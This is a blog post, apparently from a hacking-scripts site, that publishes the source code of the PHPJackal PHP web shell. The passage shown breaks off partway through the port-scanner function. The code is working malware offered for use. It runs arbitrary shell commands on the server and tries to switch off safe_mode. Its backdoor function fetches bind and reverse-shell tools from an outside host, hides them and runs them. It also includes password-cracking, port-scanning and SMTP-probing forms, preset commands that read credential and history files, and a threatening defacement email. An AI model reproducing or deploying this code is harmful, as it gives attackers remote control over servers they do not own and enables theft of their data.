---
id: 262
title: PHPJackal Shell
author: admin
layout: post
guid: http://hackingscripts.com/?p=262
permalink: /phpjackal-shell/
categories:
  - PHP
tags:
  - PHP
  - PHPJackal
---
PHPJackal v$v &#8211; Powered By NetJackal

### PHPJackal Shell Source Code

{% highlight php %}<?php
#--Config--#
$login_password= ''; //Set password
#----------#
error_reporting(E_ALL);
set_time_limit(0);
ini_set("max_execution_time","0");
ini_set("memory_limit","9999M");
set_magic_quotes_runtime(0);
if(!isset($_SERVER))$_SERVER = &$HTTP_SERVER_VARS;
if(!isset($_POST))$_POST = &$HTTP_POST_VARS;
if(!isset($_GET))$_GET = &$HTTP_GET_VARS;
if(!isset($_COOKIE))$_COOKIE=$HTTP_COOKIE_VARS;
$_REQUEST = array_merge($_GET, $_POST);
if (get_magic_quotes_gpc()){
foreach ($_REQUEST as $key=&gt;$value)
{
$_REQUEST[$key]=stripslashes($value);
}
}
function hlinK($str=""){
$myvars=array('workingdiR','urL','imagE','namE','filE','downloaD','seC','cP','mV','rN','deL');
$ret=$_SERVER['PHP_SELF']."?";
$new=explode("&",$str);
foreach ($_GET as $key =&gt; $v){
$add=1;
foreach($new as $m){
$el = explode("=", $m);
if ($el[0]==$key)$add=0;
}
if($add)if(!in_array($key,$myvars))$ret.=$key."=".$v."&";
}
$ret.=$str;
return $ret;
}
if(!empty($login_password)){
if(!empty($_REQUEST['fpassw'])){
if($_REQUEST['fpassw']==$login_password)setcookie('passw',md5($_REQUEST['fpassw']));
@header("Location: ".hlinK());
}
if(empty($_COOKIE['passw']) || $_COOKIE['passw']!=md5($login_password))die("&lt;html&gt;&lt;body&gt;&lt;table&gt;&lt;form method=post&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;&lt;input type=hidden name=seC value=about&gt;&lt;input type=password name=fpassw&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=login&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;");
}
if (!empty($_REQUEST['workingdiR'])) chdir($_REQUEST['workingdiR']);
function checkthisporT($ip,$port,$timeout,$type=0){
if(!$type){
$scan=@fsockopen($ip,$port,$n,$s,$timeout);
if($scan){fclose($scan);return 1;}
}
elseif(function_exists('socket_set_timeout')){
$scan=@fsockopen("udp://".$ip,$port);
if($scan){
socket_set_timeout($scan,$timeout);
@fwrite($scan,"\x00");
$s=time();
fread($scan,1);
if((time()-$s)&gt;=$timeout){fclose($scan);return 1;}
}
}
return 0;
}
if (!function_exists("file_get_contents")){
function file_get_contents($addr){
$a = fopen($addr,"r");
$tmp = fread($a,filesize($a));
fclose($a);
if($a)return $tmp;
}
}
if (!function_exists("file_put_contents")){
function file_put_contents($addr,$con){
$a = fopen($addr,"w");
if(!$a)return 0;
fwrite($a,$con);
fclose($a);
return strlen($con);
}
}
function flusheR(){
flush();@ob_flush();
}
if (!empty($_REQUEST['downloaD'])){
@ob_clean();
$dl=$_REQUEST['downloaD'];
$con=file_get_contents($dl);
header("Content-type: application/octet-stream");
header("Content-disposition: attachment; filename=\"$dl\";");
header("Content-length: ".strlen($con));
echo $con;
exit;
}
if (!empty($_REQUEST['imagE'])){
$img=$_REQUEST['imagE'];
header("Content-type: imagE/gif");
header("Content-length: ".filesize($img));
header("Last-Modified: ".date("r",filemtime($img)));
echo file_get_contents($img);
exit;
}
@header("Cache-Control: no-cache, must-revalidate");
@header("Expires: Mon, 7 Aug 1987 05:00:00 GMT");
function showsizE($size){
if ($size&gt;=1073741824)$size = round(($size/1073741824) ,2)." GB";
elseif ($size&gt;=1048576)$size = round(($size/1048576),2)." MB";
elseif ($size&gt;=1024)$size = round(($size/1024),2)." KB";
else $size .= " B";
return $size;
}
if (substr((strtoupper(php_unamE())),0,3)=="WIN") $windows=1; else $windows=0;
$errorbox = "&lt;table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"100%\"&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Error: &lt;/b&gt;";
$et = "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
$v="1.5";
$msgbox="&lt;br&gt;&lt;table border=0 cellpadding=0 cellspacing=0
 style=\"border-collapse: collapse\" bordercolor=\"#282828\"
 bgcolor=\"#333333\" width=\"100%\"&gt;&lt;tr&gt;&lt;td align=\"center\"&gt;";
$intro="&lt;center&gt;&lt;table border=0 style=\"border-collapse: collapse\"
 bordercolor=\"#282828\"&gt;&lt;tr&gt;&lt;td bgcolor=\"#330000\"&gt;&lt;b&gt;Script:&lt;/b&gt;&lt;br&gt;"
 .str_repeat("-=-",25)."&lt;br&gt;&lt;b&gt;Name:&lt;/b&gt; Egyptian Hacker&lt;br&gt;&lt;b&gt;Version:&lt;/b&gt;
  $v&lt;br&gt;&lt;br&gt;&lt;b&gt;Author:&lt;/b&gt;
  &lt;br&gt;".str_repeat("-=-",25)."&lt;br&gt;
  &lt;b&gt;Name:&lt;/b&gt; Elswify Scripts&lt;br&gt;&lt;b&gt;Country:&lt;/b&gt;
  Egypt&lt;br&gt;&lt;b&gt;Email:&lt;/b&gt; &lt;a href=\"mailto:elswifymoka122@yahoo.com?subject=PHPJackal\"&gt;elswifymoka122@yahoo.com&lt;/a&gt;&lt;br&gt;&lt;/font&gt;$et&lt;/center&gt;";
$footer="${msgbox}PHPJackal v$v - Powered By &lt;a href=\"http://netjackal.by.ru\" target=\"_blank\"&gt;NetJackal&lt;/a&gt;$et";
$hcwd="&lt;input type=hidden name=workingdiR value=\"".getcwd()."\"&gt;";
$t = "&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"&gt;&lt;tr&gt;&lt;td width=\"40%\" bgcolor=\"#333333\"&gt;";
$crack="&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\" name=form&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Dictionary:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text name=dictionary size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Dictionary type:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\"&gt;Simple (P)&lt;input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\"&gt;Combo (U:P)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Username:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text size=35 value=root name=user&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Server:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text name=target value=localhost size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\" align=right&gt;$hcwd&lt;input class=buttons type=submit value=Start&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";
function namE(){
$name='';
srand((double)microtime()*100000);
for ($i=0;$i&lt;=rand(3,10);$i++){
$name.=chr(rand(97,122));
}
return $name;
}
function whereistmP(){
$uploadtmp=ini_get('upload_tmp_dir');
$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');
if(is_dir('/tmp') && is_writable('/tmp'))return '/tmp';
if(is_dir('/usr/tmp') && is_writable('/usr/tmp'))return '/usr/tmp';
if(is_dir('/var/tmp') && is_writable('/var/tmp'))return '/var/tmp';
if(is_dir($uploadtmp) && is_writable($uploadtmp))return $uploadtmp;
if(is_dir($envtmp) && is_writable($envtmp))return $envtmp;
return ".";
}
function shelL($command){
global $windows,$disablefunctions;
$exec = '';$output= '';
$dep[]=array('pipe','r');$dep[]=array('pipe','w');
if(is_callable('passthru') && !strstr($disablefunctions,'passthru')){ @ob_start();passthru($command);$exec=@ob_get_contents();@ob_clean();@ob_end_clean();}
elseif(is_callable('system') && !strstr($disablefunctions,'system')){$tmp = @ob_get_contents(); @ob_clean();system($command) ; $output = @ob_get_contents(); @ob_clean(); $exec= $tmp; }
elseif(is_callable('exec') && !strstr($disablefunctions,'exec')) {exec($command,$output);$output = join("\n",$output);$exec= $output;}
elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}
elseif(is_resource($output=popen($command,"r"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}
elseif(is_resource($res=proc_open($command,$dep,$pipes))){while(!feof($pipes[1])){$line = fgets($pipes[1]); $output.=$line;}$exec= $output;proc_close($res);}
elseif ($windows && is_object($ws = new COM("WScript.Shell"))){$dir=(isset($_SERVER["TEMP"]))?$_SERVER["TEMP"]:ini_get('upload_tmp_dir') ;$name = $_SERVER["TEMP"].namE();$ws-&gt;Run("cmd.exe /C $command &gt;$name", 0, true);$exec = file_get_contents($name);unlink($name);}
return $exec;
}
function downloadiT($get,$put){
$fo=@strtolower(ini_get('allow_url_fopen'));
if($fo || $fo=='on')$con=file_get_contents($get);
else{
$u=parse_url($get);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
$url=fsockopen($host, 80, $en, $es, 12);
fputs($url, "GET $file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");
$tmp=$con='';
while($tmp!="\r\n")$tmp=fgets($url);
while(!feof($url))$con.=fgets($url);
}
$mk=file_put_contents($put,$con);
if($mk)return 1;
return 0;
}
function smtplogiN($addr,$user,$pass,$timeout){
$sock=fsockopen($addr,25,$n,$s,$timeout);
if(!$sock)return -1;
fread($sock,1024);
fputs($sock,'ehlo '.namE()."\r\n");
$res=substr(fgets($sock,512),0,1);
if($res!='2')return 0;
fgets($sock,512);fgets($sock,512);fgets($sock,512);
fputs($sock,"AUTH LOGIN\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='334')return 0;
fputs($sock,base64_encode($user)."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='334')return 0;
fputs($sock,base64_encode($pass)."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='235')return 0;
return 1;
}
function checksmtP($host,$timeout){
$from=strtolower(namE())."@".strtolower(namE()).".com";
$sock=@fsockopen($host,25,$n,$s,$timeout);
if(!$sock)return -1;
$res=substr(fgets($sock,512),0,3);
if($res!='220')return 0;
fputs($sock,'HELO '.namE()."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"MAIL FROM: &lt;$from&gt;\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"RCPT TO: &lt;contact@persianblog.com&gt;\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"DATA\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='354')return 0;
fputs($sock,"From: ".namE()." ".namE()." &lt;$from&gt;\r\nSubject: ".namE()."\r\nMIME-Version: 1.0\r\nContent-Type: text/plain;\r\n\r\n".namE().namE().namE()."\r\n.\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
return 1;
}
function check_urL($url,$method,$search,$timeout){
if(empty($search))$search='200';
$u=parse_url($url);
$method=strtoupper($method);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
$data=(!empty($u['query']))?$u['query']:'';
if(!empty($data))$data="?$data";
$sock=@fsockopen($host,80,$en,$es,$timeout);
if($sock){
fputs($sock,"$method $file$data HTTP/1.0\r\n");
fputs($sock,"Host: $host\r\n");
if($method=='GET')fputs($sock,"\r\n");
elseif($method='POST')fputs($sock,"Content-Type: application/x-www-form-urlencoded\r\nContent-length: ".strlen($data)."\r\nAccept-Encoding: text\r\nConnection: close\r\n\r\n$data");
else return 0;
if($search=='200')if(substr(fgets($sock),0,3)=="200"){fclose($sock);return 1;}else {fclose($sock);return 0;}
while(!feof($sock)){
$res=trim(fgets($sock));
if(!empty($res))if(strstr($res,$search)){fclose($sock);return 1;}
}
fclose($sock);
}
return 0;
}
function get_sw_namE($host,$timeout){
$sock=@fsockopen($host,80,$en,$es,$timeout);
if($sock){
$page=namE().namE();
fputs($sock,"GET /$page HTTP/1.0\r\n\r\n");
while(!feof($sock)){
$con=fgets($sock);
if(strstr($con,'Server:')){$ser=substr($con,strpos($con,' ')+1);return $ser;}
}
fclose($sock);
return -1;
}return 0;
}
function snmpchecK($ip,$com,$timeout){
$res=0;
$n=chr(0x00);
$packet=chr(0x30).chr(0x26).chr(0x02).chr(0x01). chr(0x00). chr(0x04). chr(strlen($com)). 
$com. chr(0xA0). 
chr(0x19). chr(0x02). chr(0x01). chr(0x01). chr(0x02). chr(0x01). $n.
chr(0x02). chr(0x01). $n. chr(0x30). chr(0x0E). chr(0x30). chr(0x0C).
chr(0x06). chr(0x08). chr(0x2B). chr(0x06). chr(0x01). chr(0x02). chr(0x01).
chr(0x01). chr(0x01). $n. chr(0x05). $n;
$sock=@fsockopen("udp://$ip",161);
socket_set_timeout($sock,$timeout);
@fputs($sock,$packet);
socket_set_timeout($sock,$timeout);
$res=fgets($sock);
fclose($sock);
return $res;
}

$safemode=(@ini_get('safe_mode') or strtolower(@ini_get('safe_mode')) == 'on')?'ON':'OFF';
if($safemode=="ON"){@ini_restore("safe_mode");@ini_restore("open_basedir");}
$disablefunctions = @ini_get('disable_functions');
if (!function_exists("str_repeat")){
function str_repeat($str,$c){
$r="";
for($i=0; $i &lt; $cu; $i++)$r.=$str;
return $r;
}
}

function brshelL(){
global $errorbox, $windows,$et,$hcwd;
$_REQUEST['C']=(isset($_REQUEST['C']))?$_REQUEST['C']:0;
$addr='http://netjackal.by.ru/backdoor';
$error="$errorbox Can not make backdoor file, go to writeable folder.$et";
$n=namE();
if(!$windows)$n=".$n";
$d=whereistmP();
$name=$d.DIRECTORY_SEPARATOR.$n;
$perl=(!$windows && shelL('which perl'))?$perl=shelL('which perl'):'perl';
$c=($_REQUEST['C'])?1:0;
if (!empty($_REQUEST['port']) && ($_REQUEST['port']&lt;=65535) && ($_REQUEST['port']&gt;=1) ){
$port=(int)$_REQUEST['port'];
if($windows){
if($c){
$name.=".exe";
$bd=downloadiT("$addr/nc.exe",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("$name -L -p $port -e cmd.exe");
}else{
$name = $name.".pl";
$bd=downloadiT("$addr/winbind.pl",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("perl.exe $name $port");
}
}
else{
if($c){
$bd=downloadiT("$addr/bind.c",$name);
if (!$bd) echo $error;else shelL("cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &");
}else{
$bd=downloadiT("$addr/bind.pl",$name);
if (!$bd)echo $error; else shelL("cd $d;$perl $n $port &");
echo "&lt;font color=blue&gt;Backdoor is waiting for you on $port.&lt;br&gt;&lt;/font&gt;";
}
}
}
elseif(!empty($_REQUEST['rport']) && ($_REQUEST['rport']&lt;=65535) && ($_REQUEST['rport']&gt;=1) && !empty($_REQUEST['ip'])){
$ip=$_REQUEST['ip'];
$port=(int)$_REQUEST['rport'];
if($windows){
if($c){
$name.='.exe';
$bd=downloadiT("$addr/nc.exe",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("$name $ip $port -e cmd.exe");
}else{
$name = $name.".pl";
$bd=downloadiT("$addr/winrc.pl",$name);
shelL("attrib +H $name");
if (!$bd)echo $error; else shelL("perl.exe $name $ip $port");
}
}
else{
if($c){
$bd=downloadiT("$addr/rc.c",$name);
if(!$bd) echo $error;else shelL("cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &");
}else{
$bd=downloadiT("$addr/rc.pl",$name);
if(!$bd)echo $error;else shelL("cd $d;$perl $n $ip $port &");
}
}
echo "&lt;font color=blue&gt;Done!&lt;/font&gt;";}
else{echo "&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"&gt;&lt;tr&gt;&lt;td&gt;&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"50%\"&gt;&lt;tr&gt;&lt;td width=\"50%\" bgcolor=\"#333333\"&gt;Bind shelL:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Port:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text name=port value=55501 size=5&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Type:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=radio style=\"border-width:1px;background-color:#808080;\" value=0 checked name=C&gt;PERL&lt;input type=radio style=\"border-width:1px;background-color:#808080;\" name=C value=1&gt;"; if($windows)echo "EXE"; else echo "C";echo"&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\" align=right&gt;$hcwd&lt;input type=submit class=buttons value=Bind&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt;&lt;td&gt;&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"50%\"&gt;&lt;tr&gt;&lt;td width=\"40%\" bgcolor=\"#333333\"&gt;Reverse shelL:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;IP:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text name=ip value=";echo $_SERVER["REMOTE_ADDR"]; echo " size=17&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Port:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text name=rport value=53 size=5&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Type:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=radio style=\"border-width:1px;background-color:#808080;\" value=0 checked name=C&gt;PERL&lt;input type=radio style=\"border-width:1px;background-color:#808080;\" name=C value=1&gt;"; if($windows)echo "EXE"; else echo "C";echo"&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\" align=right&gt;$hcwd&lt;input class=buttons type=submit value=Connect&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;$et";}}
function showimagE($img){
echo "&lt;center&gt;&lt;img border=0 src=\"".hlinK("imagE=$img&&workingdiR=".getcwd())."\"&gt;&lt;/center&gt;";}
function editoR($file){
global $errorbox,$et,$hcwd;
if (is_file($file)){
if (!is_readable($file)){echo "$errorbox File is not readable$et&lt;br&gt;";}
if (!is_writeable($file)){echo "$errorbox File is not writeable$et&lt;br&gt;";}
$data = file_get_contents($file);
echo "&lt;center&gt;&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"&gt;&lt;tr&gt;&lt;td width=\"10%\" bgcolor=\"#808080\"&gt;&lt;form method=\"POST\"&gt;$hcwd&lt;input type=text value=\"".htmlspecialchars($file)."\" size=75 name=file&gt;&lt;input type=submit class=buttons name=Open value=Open&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;br&gt;&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"&gt;&lt;tr&gt;&lt;td width=\"40%\" bgcolor=\"#666666\"&gt;&lt;form method=\"POST\"&gt;&lt;textarea rows=\"18\" name=\"edited\" cols=\"64\"&gt;";
echo htmlspecialchars($data);
echo "&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"10%\" bgcolor=\"#808080\"&gt;&lt;input type=text value=\"$file\" size=80 name=file&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td width=\"40%\" bgcolor=\"#666666\" align=\"right\"&gt;";
}
else {echo "&lt;center&gt;&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"&gt;&lt;tr&gt;&lt;td width=\"10%\" bgcolor=\"#808080\"&gt;&lt;form method=\"POST\"&gt;&lt;input type=text value=\"".getcwd()."\" size=75 name=file&gt;$hcwd&lt;input type=submit class=buttons name=Open value=Open&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;br&gt;&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"&gt;&lt;tr&gt;&lt;td width=\"40%\" bgcolor=\"#666666\"&gt;&lt;form method=\"POST\"&gt;&lt;textarea rows=\"18\" name=\"edited\" cols=\"63\"&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"10%\" bgcolor=\"#808080\"&gt;&lt;input type=text value=\"".getcwd()."\" size=80 name=file&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td width=\"40%\" bgcolor=\"#666666\" align=\"right\"&gt;";
}
echo "$hcwd&lt;input type=submit class=buttons name=Save value=Save&gt;&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/center&gt;";
}
function webshelL(){
global $windows,$hcwd;
if($windows){
$alias="&lt;option value=\"netstat -an\"&gt;Display open ports&lt;/option&gt;&lt;option value=\"tasklist\"&gt;List of processes&lt;/option&gt;&lt;option value=\"systeminfo\"&gt;System information&lt;/option&gt;&lt;option value=\"ipconfig /all\"&gt;IP configuration&lt;/option&gt;&lt;option value=\"getmac\"&gt;Get MAC address&lt;/option&gt;&lt;option value=\"net start\"&gt;Services list&lt;/option&gt;&lt;option value=\"net view\"&gt;Machines in domain&lt;/option&gt;&lt;option value=\"net user\"&gt;Users list&lt;/option&gt;&lt;option value=\"gpresult\"&gt;Group policy&lt;/option&gt;&lt;option value=\"shutdown -s -f -t 1\"&gt;Turn off the server&lt;/option&gt;";
}
else{
$alias="&lt;option value=\"netstat -an | grep -i listen\"&gt;Display open ports&lt;/option&gt;&lt;option value=\"last -a -n 250 -i\"&gt;Show last 250 logged in users&lt;/option&gt;&lt;option value=\"which wget curl lynx w3m\"&gt;Downloaders&lt;/option&gt;&lt;option value=\"find / -perm -2 -type d -print\"&gt;Find world-writable directories&lt;/option&gt;&lt;option value=\"find . -perm -2 -type d -print\"&gt;Find world-writable directories(in current directory)&lt;/option&gt;&lt;option value=\"find / -perm -2 -type f -print\"&gt;Find world-writable files&lt;/option&gt;&lt;option value=\"find . -perm -2 -type f -print\"&gt;Find world-writable files(in current directory)&lt;/option&gt;&lt;option value=\"find / -type f -perm 04000 -ls\"&gt;Find files with SUID bit set&lt;/option&gt;&lt;option value=\"find / -type f -perm 02000 -ls\"&gt;Find files with SGID bit set&lt;/option&gt;&lt;option value=\"find / -name .htpasswd -type f\"&gt;Find .htpasswd files&lt;/option&gt;&lt;option value=\"find / -type f -name .bash_history\"&gt;Find .bash_history files&lt;/option&gt;&lt;option value=\"cat /etc/syslog.conf\"&gt;View syslog.conf&lt;/option&gt;&lt;option value=\"cat cat /etc/hosts\"&gt;View hosts&lt;/option&gt;&lt;option value=\"ps auxw\"&gt;List of processes&lt;/option&gt;";
if(is_dir('/etc/valiases'))$alias.="&lt;option value=\"ls -l /etc/valiases\"&gt;List of Cpanel`s domains(valiases)&lt;/option&gt;";if(is_dir('/etc/vdomainaliases'))$alias.="&lt;option value=\"ls -l /etc/vdomainaliases\"&gt;List Cpanel`s domains(vdomainaliases)&lt;/option&gt;";if(file_exists('/var/cpanel/accounting.log'))$alias.="&lt;option value=\"cat /var/cpanel/accounting.log\"&gt;Display Cpanel`s log&lt;/option&gt;";
if(is_dir('/var/spool/mail/'))$alias.="&lt;option value=\"ls /var/spool/mail/\"&gt;Mailboxes list&lt;/option&gt;";
}
echo "&lt;center&gt;&lt;table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"65%\"&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\"&gt;&lt;b&gt;Location:&lt;/b&gt;&lt;input type=text name=workingdiR size=82 value=\"".getcwd()."\"&gt;&lt;input class=buttons type=submit value=Change&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;br&gt;&lt;table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"65%\"&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Web Shell:&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;textarea rows=\"22\" cols=\"78\"&gt;";
if (!empty($_REQUEST['cmd'])) echo shelL($_REQUEST['cmd']);
echo"&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=post&gt;&lt;tr&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text size=91 name=cmd value=\"";if (!empty($_REQUEST['cmd'])) echo htmlspecialchars(($_REQUEST['cmd']));elseif(!$windows) echo "cat /etc/passwd";echo "\"&gt;$hcwd&lt;input class=buttons type=submit value=Execute&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=post&gt;&lt;tr&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;select name=\"cmd\" width=70&gt;$alias&lt;/select&gt;$hcwd&lt;input class=buttons type=submit value=Execute&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/table&gt;&lt;center&gt;";
}
function maileR(){
global $msgbox,$et,$hcwd;
$cwd= getcwd();
if (!empty($_REQUEST['subject'])&&!empty($_REQUEST['body'])&&!empty($_REQUEST['from'])&&!empty($_REQUEST['to'])){
$to=$_REQUEST['to'];$from=$_REQUEST['from'];$subject=$_REQUEST['subject'];$body=$_REQUEST['body'];
if (!mail($to,$subject,$body,"From: $from"))break;
echo "$msgbox&lt;b&gt;Mail sent!&lt;/b&gt;&lt;br&gt;$et";
}
echo "&lt;center&gt;&lt;br&gt;&lt;table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"50%\"&gt;&lt;tr&gt;&lt;form method=\"POST\"&gt;&lt;td&gt;&lt;b&gt;Mailer:&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;SMTP&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;".ini_get('SMTP')." (".ini_get('smtp_port').")&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td bgcolor=\"#808080\"&gt;From:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input name=from type=text value=\"evil@hell.gov\" size=55&gt;$hcwd&lt;/td&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;To:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input name=to type=text value=\""; if (!empty($_REQUEST['to'])) echo htmlspecialchars($_REQUEST['to']); elseif(!empty($_ENV["SERVER_ADMIN"])) echo $_ENV["SERVER_ADMIN"];else echo "admin@".getenv('HTTP_HOST'); echo "\" size=55&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td bgcolor=\"#808080\"&gt;Subject:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input name=subject type=text value=\"YOUR SERVER HAS BEED HACKED :-P\" size=55&gt;&lt;/td&gt;&lt;tr&gt;&lt;td bgcolor=\"#666666\"&gt;Body:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;textarea rows=\"18\" cols=\"43\" name=body&gt;Admin, your system has been hacked! if you don`t seCure it, next time i`ll format your box.&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"10%\" bgcolor=\"#808080\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#808080\" align=\"right\"&gt;&lt;input type=submit class=buttons value=Send&gt;&lt;/form&gt;$et";
}
function scanneR(){
global $hcwd;
if (!empty($_SERVER["SERVER_ADDR"])) $host=$_SERVER["SERVER_ADDR"];else $host ="127.0.0.1";
$udp=(empty($_REQUEST['udp']))?0:1;$tcp=(empty($_REQUEST['tcp']))?0:1;
if (($udp||$tcp) && !empty($_REQUEST['target']) && !empty($_REQUEST['fromport']) && !empty($_REQUEST['toport']) && !empty($_REQUEST['timeout']) && !empty($_REQUEST['portscanner'])){
